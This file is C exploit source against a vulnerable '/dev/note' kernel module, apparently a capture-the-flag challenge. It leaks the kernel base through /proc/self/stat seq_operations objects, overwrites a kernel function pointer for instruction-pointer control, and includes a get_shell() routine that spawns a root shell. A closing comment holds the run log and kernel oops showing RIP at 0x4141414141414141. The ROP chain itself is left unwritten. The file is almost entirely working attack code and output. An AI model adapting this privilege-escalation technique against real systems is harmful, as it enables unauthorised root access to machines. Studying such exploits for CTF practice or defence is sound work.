#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <linux/userfaultfd.h>

#define REMOVE 0xc12ed002
#define ALLOC 0xc12ed001
#define WRITE 0xc12ed003
#define READ 0xc12ed004

int fd = 0, seq_fd = 0;
static int page_size = 0x1000;
unsigned long global_sharer = 0;
char buf[0x1000];
long condition = 0;
unsigned long pivot_point = 0;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void delete_n()
{
	unsigned long arg[2];
	unsigned long ret = ioctl(fd, REMOVE, arg);
	printf("delete_n() returns 0x%lx\n", ret);
}

void alloc_n(unsigned long size)
{
	unsigned long arg[2];
	arg[0] = size;
	unsigned long ret = ioctl(fd, ALLOC, arg);
	printf("alloc_n(0x%lx) returns 0x%lx\n", size, ret);
}

void read_n(unsigned long addr, unsigned long size)
{
	unsigned long arg[2];
	arg[0] = size;
	arg[1] = addr;
	unsigned long ret = ioctl(fd, READ, arg);
	printf("read_n(0x%lx, 0x%lx) returns 0x%lx\n", addr, size, ret);
}

void write_n(unsigned long addr, unsigned long size)
{
	unsigned long arg[2];
	arg[0] = size;
	arg[1] = addr;
	unsigned long ret = ioctl(fd, WRITE, arg);
	printf("write_n(0x%lx(\"%s\"), 0x%lx) returns 0x%lx\n", addr, addr, size, ret);
}

int main()
{
	save_state();
	system("cat /symbols | grep \"\\[note\"");
	system("cat /symbols | grep \" _text\"");
	
	fd = open("/dev/note", O_RDWR);
	if (!fd)	exit(puts("ERROR in open()"));

	int seq[0x10] = {0};
	for (int l=0; l<5; l++)
		seq[l] = open("/proc/self/stat", O_CREAT | O_RDONLY);
	if (!seq[0])	exit(puts("ERROR in open()"));

	alloc_n(0x20);
	write_n("\x00\x00\x00\x00\x00\x00\x00\x00BBBBBBBBCCCCCCCCDDDDDDDD", 0x20);
	seq_fd = open("/proc/self/stat", O_CREAT | O_RDONLY);
	seq_fd = open("/proc/self/stat", O_CREAT | O_RDONLY);
	read_n(buf, 0x20);

	unsigned long *ptr = (unsigned long)buf;
	unsigned long kernel_base = ptr[3] - 0x170ec0;
	printf("kernel_base: 0x%lx\n", kernel_base);

	write_n("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", 0x20);
	read(seq_fd, buf, 1);
	// We got kernel_leak + got RIP control, no smap, so store ROP-Chain in userland and jump :)
	read(0, buf, 1);
	
	return 0;
}
/*
Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline

Boot took 1.81 seconds

/ $ ./exploit 
[*] Saved state
ffffffffc0217000 t mod_ioctl	[note]
ffffffffc021715f t module_cleanup	[note]
ffffffffc021715f t cleanup_module	[note]
ffffffffb3200000 T _text
alloc_n(0x20) returns 0x0
write_n(0x49715f(""), 0x20) returns 0x0
read_n(0x4c54a0, 0x20) returns 0x0
kernel_base: 0xffffffffb3200000
write_n(0x497180("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD"), 0x20) returns 0x0
general protection fault: 0000 [#1] SMP NOPTI
CPU: 0 PID: 58 Comm: exploit Tainted: G           O      4.19.98 #14
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:0x4141414141414141
Code: Bad RIP value.
RSP: 0018:ffffb0b20012bd70 EFLAGS: 00000246
RAX: 4141414141414141 RBX: 0000000000000000 RCX: 0000000000004c9f
RDX: 0000000000004c9e RSI: ffff9a6cce622f28 RDI: ffff9a6cce622f00
RBP: ffffb0b20012bdd0 R08: ffff9a6cce680000 R09: 0000000000000001
R10: 0000000000000000 R11: 0000000000000000 R12: ffff9a6cce622f28
R13: 00000000ffffffff R14: ffff9a6cce622f00 R15: ffffb0b20012bea0
FS:  00000000004c7880(0000) GS:ffff9a6ccf600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000004abd40 CR3: 000000000e7cc000 CR4: 00000000001006f0
Call Trace:
 ? seq_read+0xb1/0x3e0
 ? tty_ldisc_deref+0x11/0x20
 __vfs_read+0x26/0x140
 vfs_read+0x94/0x130
 ksys_read+0x48/0xc0
 __x64_sys_read+0x15/0x20
 do_syscall_64+0x57/0x260
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x4021f2
Code: 8b 4d f8 64 48 33 0c 25 28 00 00 00 74 05 e8 e5 3a 05 00 c9 c3 0f 1f 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 0f 05 <48> 3d 00 f0 ff 4
RSP: 002b:00007ffea3054c38 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
RAX: ffffffffffffffda RBX: 0000000000400518 RCX: 00000000004021f2
RDX: 0000000000000001 RSI: 00000000004c54a0 RDI: 000000000000000a
RBP: 00007ffea3054cb0 R08: 0000000000000000 R09: 0000000000000048
R10: 00000000ffffffff R11: 0000000000000246 R12: 00000000004036b0
R13: 0000000000000000 R14: 00000000004c2018 R15: 0000000000000000
Modules linked in: note(O)
---[ end trace 5da4a365a789a68a ]---
RIP: 0010:0x4141414141414141
Code: Bad RIP value.
RSP: 0018:ffffb0b20012bd70 EFLAGS: 00000246
RAX: 4141414141414141 RBX: 0000000000000000 RCX: 0000000000004c9f
RDX: 0000000000004c9e RSI: ffff9a6cce622f28 RDI: ffff9a6cce622f00
RBP: ffffb0b20012bdd0 R08: ffff9a6cce680000 R09: 0000000000000001
R10: 0000000000000000 R11: 0000000000000000 R12: ffff9a6cce622f28
R13: 00000000ffffffff R14: ffff9a6cce622f00 R15: ffffb0b20012bea0
FS:  00000000004c7880(0000) GS:ffff9a6ccf600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000004abd40 CR3: 000000000e7cc000 CR4: 00000000001006f0
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0x32200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 1 seconds..
qemu-system-x86_64: terminating on signal 2
*/